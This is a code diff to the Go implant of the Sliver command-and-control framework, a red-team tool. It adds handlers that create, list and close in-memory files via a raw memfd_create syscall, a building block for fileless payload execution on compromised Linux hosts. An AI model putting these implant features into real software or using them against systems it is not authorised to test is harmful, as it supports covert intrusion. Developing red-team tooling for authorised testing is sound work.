@@ -24,10 +24,13 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
+	"runtime"
 	"strconv"
+	"strings"
 	"syscall"
+	"time"
+	"unsafe"
 
-	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -86,6 +89,10 @@ var (
 		sliverpb.MsgChmodReq:   chmodHandler,
 		sliverpb.MsgChownReq:   chownHandler,
 		sliverpb.MsgChtimesReq: chtimesHandler,
+
+		sliverpb.MsgMemfilesListReq: memfilesListHandler,
+		sliverpb.MsgMemfilesAddReq:  memfilesAddHandler,
+		sliverpb.MsgMemfilesRmReq:   memfilesRmHandler,
 	}
 )
 
@@ -151,6 +158,130 @@ func getGid(fileInfo os.FileInfo) string {
 		return ""
 	}
 	return grp.Name
+}
+
+func memfilesListHandler(data []byte, resp RPCResponse) {
+
+	pid := os.Getpid()
+	path := fmt.Sprintf("/proc/%d/fd/", pid)
+	dir, files, err := getDirList(path)
+
+	// Convert directory listing to protobuf
+	timezone, offset := time.Now().Zone()
+	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
+	if err == nil {
+		dirList.Exists = true
+	} else {
+		dirList.Exists = false
+	}
+	dirList.Files = []*sliverpb.FileInfo{}
+
+	for _, dirEntry := range files {
+		//log.Printf("File: %s\n", dirEntry.Name())
+		dirEntry.Name()
+
+		fileInfo, err := dirEntry.Info()
+		sliverFileInfo := &sliverpb.FileInfo{}
+		if err == nil {
+
+			sliverFileInfo.Size = fileInfo.Size()
+			sliverFileInfo.ModTime = fileInfo.ModTime().Unix()
+			sliverFileInfo.Mode = fileInfo.Mode().String()
+			// Check if this is a symlink, and if so, add the path the link points to
+			if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+
+				link_str, err := os.Readlink(path + dirEntry.Name())
+				if err == nil && strings.Contains(link_str, "/memfd:") {
+
+					sliverFileInfo.Uid = getUid(fileInfo)
+					sliverFileInfo.Gid = getGid(fileInfo)
+					sliverFileInfo.Name = dirEntry.Name()
+					sliverFileInfo.IsDir = dirEntry.IsDir()
+					sliverFileInfo.Link = link_str
+
+					dirList.Files = append(dirList.Files, sliverFileInfo)
+				}
+			}
+		}
+	}
+
+	// Send back the response
+	data, err = proto.Marshal(dirList)
+	resp(data, err)
+
+}
+
+func memfilesAddHandler(data []byte, resp RPCResponse) {
+
+	var nrMemfdCreate int
+	memfilesAdd := &sliverpb.MemfilesAdd{}
+	memfilesAdd.Response = &commonpb.Response{}
+
+	memfdName := taskrunner.RandomString(8)
+	//memfdName := "/tmp/a"
+	memfd, err := syscall.BytePtrFromString(memfdName)
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Printf("Error during conversion: %s\n", err)
+		//{{end}}
+		return
+	}
+	if runtime.GOARCH == "386" {
+		nrMemfdCreate = 356
+	} else {
+		nrMemfdCreate =
+			319
+	}
+
+	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
+	fd_str := fmt.Sprintf("%d", fd)
+	fd_int, err := strconv.ParseInt(fd_str, 0, 64)
+	//log.Printf("Fd: %d\n", fd_int)
+	memfilesAdd.Fd = fd_int
+
+	data, err = proto.Marshal(memfilesAdd)
+	resp(data, err)
+
+}
+
+func memfilesRmHandler(data []byte, resp RPCResponse) {
+
+	memfilesRmReq := &sliverpb.MemfilesRmReq{}
+	err := proto.Unmarshal(data, memfilesRmReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	memfilesRm := &sliverpb.MemfilesRm{}
+	memfilesRm.Fd = memfilesRmReq.Fd
+	memfilesRm.Response = &commonpb.Response{}
+
+	pid := os.Getpid()
+	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, memfilesRmReq.Fd)
+	fileInfo, err := os.Lstat(fdPath)
+
+	if err == nil {
+
+		if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+			link_str, err := os.Readlink(fdPath)
+			if err == nil && strings.Contains(link_str, "/memfd:") {
+				syscall.Close(int(memfilesRmReq.Fd))
+			} else {
+				memfilesRm.Response.Err = "file descriptor does not represent a memfd"
+			}
+		} else {
+			memfilesRm.Response.Err = "file descriptor does not represent a symlink"
+		}
+	} else {
+		memfilesRm.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(memfilesRm)
+	resp(data, err)
+
 }
 
 func chmodHandler(data []byte, resp RPCResponse) {
